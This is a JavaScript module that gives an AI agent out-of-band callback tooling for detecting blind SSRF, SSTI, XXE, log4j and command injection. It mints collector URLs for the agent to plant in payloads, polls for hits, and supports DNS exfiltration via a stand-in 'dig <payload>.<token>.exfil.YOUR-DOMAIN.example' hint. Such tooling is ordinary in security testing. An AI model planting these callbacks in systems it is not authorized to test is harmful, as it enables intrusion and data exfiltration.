// Out-of-band (OOB) callback primitive for the agent. Two operations:
//   oobAlloc  — mint a unique callback URL the agent plants into a payload
//   oobPoll   — read back the objective interactions that URL has received
//
// WHY: profile_raw_request / profile_race_request / profile_jwt_forge give the
// agent in-band attack primitives. OOB catches the BLIND class — blind SSRF, blind
// SSTI, blind XXE, log4j JNDI, blind command/template injection — where the target
// never reflects anything in the HTTP response but DOES reach out to a URL the
// agent controls. The agent embeds the alloc URL in a payload; if the target
// fetches it, the catch-all server (scripts/oob-server.mjs) records the hit and
// oobPoll surfaces it.
//
// SERVER ADDRESS: read, in order, from params.serverBase, then env OOB_SERVER_BASE,
// then the public default (set by deployer). Override OOB_SERVER_BASE if you
// deploy your own collector.
//
// BOUNDARY: oobAlloc only mints an identifier; oobPoll only returns objective
// callback records (who/when/which protocol/raw request). Neither decides whether a
// blind vulnerability exists — that verdict is the agent's, from the records.
import crypto from "node:crypto";
import http from "node:http";
import https from "node:https";

// Default OOB server: set by deployer via OOB_SERVER_BASE env or params.serverBase.
// If unset, uses PLACEHOLDER_BASE — oobAlloc/oobPoll will return a clear error
// telling the user to configure their collector.
const PUBLIC_DEFAULT_BASE = "http://YOUR-OOB-SERVER.example";
const PLACEHOLDER_BASE = "http://YOUR-OOB-SERVER.example";

// Resolve the collector base. Trailing slashes are trimmed so
// `${base}/__oob/poll` joins cleanly.
// Priority: params.serverBase > env OOB_SERVER_BASE > public default
function resolveBase(params) {
  const raw = (params && params.serverBase) || process.env.OOB_SERVER_BASE || PUBLIC_DEFAULT_BASE;
  return String(raw).replace(/\/+$/, "");
}

// Probe whether the OOB server is reachable. Returns true on any HTTP response (even 404),
// false on network error/timeout. A 404 means the server is up but the API route may have
// changed — still better to surface that than silently return a dead token.
async function pingOobServer(base, timeoutMs = 4000) {
  const u = `${base}/__oob/health`;
  return new Promise((resolve) => {
    let mod, parsed;
    try {
      parsed = new URL(u);
      mod = parsed.protocol === "https:" ? https : http;
    } catch { return resolve(false); }
    const req = mod.get(parsed, (res) => { res.resume(); resolve(true); });
    req.setTimeout(timeoutMs, () => { req.destroy(); resolve(false); });
    req.on("error", () => resolve(false));
  });
}

// DNS_ZONE for dns-mode URL construction. Mirrors OOB_DNS_ZONE env default on the server.
const DNS_ZONE = (typeof process !== "undefined" && process.env.OOB_DNS_ZONE)
  ? String(process.env.OOB_DNS_ZONE).replace(/\.$/, "")
  : "exfil.YOUR-DOMAIN.example";

// Resolve the callback URL for a given mode + token + serverBase.
// mode: "http" (default) | "redirect" | "dns"
function buildModeUrl(mode, token, serverBase) {
  switch (mode) {
    case "redirect":
      // Returns the base redirect URL; caller appends ?to=<URL-encoded-target>
      return `${serverBase}/${token}/redir?to=`;
    case "dns":
      // DNS exfil domain — agent appends as target of DNS query (e.g. dig <payload>.<token>.exfil.YOUR-DOMAIN.example)
      return `${token}.${DNS_ZONE}`;
    default: // "http"
      return `${serverBase}/${token}`;
  }
}

// Mint a unique callback token + URL. This is a worker-side primitive, so using
// crypto.randomBytes for the token is fine (16 bytes hex = 32 chars, collision-safe).
// H-OOB: performs a reachability check before returning the token so callers know
// immediately if the OOB server is down rather than planting a dead URL in a payload.
// params.mode: "http" (default), "redirect", or "dns"
export async function oobAlloc(params = {}) {
  const serverBase = resolveBase(params);
  const mode = (params.mode && ["http", "redirect", "dns"].includes(params.mode))
    ? params.mode
    : "http";
  const token = (params.token ? String(params.token) : crypto.randomBytes(16).toString("hex"))
    .replace(/[^a-zA-Z0-9_-]/g, "");
  const url = buildModeUrl(mode, token, serverBase);

  // Skip reachability check only for the old static placeholder (no server configured at all).
  if (serverBase !== PLACEHOLDER_BASE) {
    const reachable = await pingOobServer(serverBase, 4000);
    if (!reachable) {
      return {
        schema: "agent-browser-runtime.oob-alloc.v1",
        ok: false,
        error: "oob_server_unreachable",
        serverBase,
        hint: "The OOB server did not respond to a health probe. Check the server is running and accessible, or pass a different serverBase / set OOB_SERVER_BASE env.",
      };
    }
  }

  return {
    schema: "agent-browser-runtime.oob-alloc.v1",
    token,
    mode,
    url,
    serverBase,
    hint: mode === "dns"
      ? `DNS exfil: dig <payload>.${url} (A/TXT)，目标 DNS 查询后用 oob_poll 查 token`
      : mode === "redirect"
      ? `Redirect chain: append URL-encoded target to url，oob 记 callback + 302 到目标，用 oob_poll 查 token`
      : "把 url 塞进 SSRF/SSTI/XXE/log4j payload，目标回连后用 oob_poll 查 token",
    boundary: "只生成回连标识，是否有盲漏洞由 agent 看回连记录判定——NOT a vulnerability judgment",
  };
}

// HTTP(S) GET with a hard timeout, using only node built-ins. Returns parsed JSON
// or throws. Kept tiny on purpose; the OOB poll endpoint is a small JSON response.
function httpGetJson(urlStr, timeoutMs) {
  return new Promise((resolve, reject) => {
    let mod, u;
    try {
      u = new URL(urlStr);
      mod = u.protocol === "https:" ? https : http;
    } catch (e) { return reject(e); }
    const req = mod.get(u, (res) => {
      const chunks = [];
      res.on("data", (c) => chunks.push(c));
      res.on("end", () => {
        const text = Buffer.concat(chunks).toString("utf8");
        try { resolve({ status: res.statusCode, json: JSON.parse(text) }); }
        catch (_e) { reject(new Error(`non-JSON response (status ${res.statusCode}): ${text.slice(0, 200)}`)); }
      });
      res.on("error", reject);
    });
    req.setTimeout(timeoutMs, () => { req.destroy(new Error(`oob poll timed out after ${timeoutMs}ms`)); });
    req.on("error", reject);
  });
}

// Read back the interactions for a token. Server unreachable / timeout / bad
// response returns a structured { error } object instead of throwing, so the agent
// tool never crashes the worker on a dead collector.
export async function oobPoll(params = {}) {
  const serverBase = resolveBase(params);
  const token = params.token ? String(params.token) : "";
  const since = params.since ? String(params.since) : "";
  const limit = Math.max(1, Math.min(1000, Number(params.limit) || 100));
  const timeoutMs = Math.min(30_000, Math.max(500, Number(params.timeoutMs) || 8000));

  if (!token) {
    return { schema: "agent-browser-runtime.oob-poll.v1", error: "token is required", serverBase };
  }
  if (serverBase === PLACEHOLDER_BASE) {
    return {
      schema: "agent-browser-runtime.oob-poll.v1",
      token,
      serverBase,
      error: "OOB_SERVER_BASE is unset (still the placeholder YOUR-OOB-SERVER.example) — set params.serverBase or env OOB_SERVER_BASE to your collector",
    };
  }

  const qs = new URLSearchParams({ token, limit: String(limit) });
  if (since) qs.set("since", since);
  const url = `${serverBase}/__oob/poll?${qs.toString()}`;

  let res;
  try {
    res = await httpGetJson(url, timeoutMs);
  } catch (e) {
    return { schema: "agent-browser-runtime.oob-poll.v1", token, serverBase, error: String(e && e.message || e) };
  }

  const raw = (res.json && Array.isArray(res.json.interactions)) ? res.json.interactions : [];
  const interactions = raw.map((e) => ({
    source_ip: e.source_ip ?? null,
    protocol: e.protocol || "http",
    method: e.method || null,
    path: e.path || null,
    timestamp: e.timestamp || null,
    user_agent: e.user_agent ?? null,
    raw_headers: e.headers || {},
  }));

  const httpCount = interactions.filter((i) => i.protocol === "http").length;
  // Wave-10: DNS listener is now live; dns_only_count = entries with protocol="dns".
  const dnsOnlyCount = interactions.filter((i) => i.protocol === "dns").length;
  const distinctIps = new Set(interactions.map((i) => i.source_ip).filter(Boolean));

  return {
    schema: "agent-browser-runtime.oob-poll.v1",
    token,
    serverBase,
    interactionCount: interactions.length,
    interactions,
    signals: {
      http_count: httpCount,
      dns_only_count: dnsOnlyCount,
      distinct_source_ips: distinctIps.size,
    },
    boundary: "只返回客观回连记录(谁/何时/什么协议回连)，NOT a vulnerability judgment",
  };
}
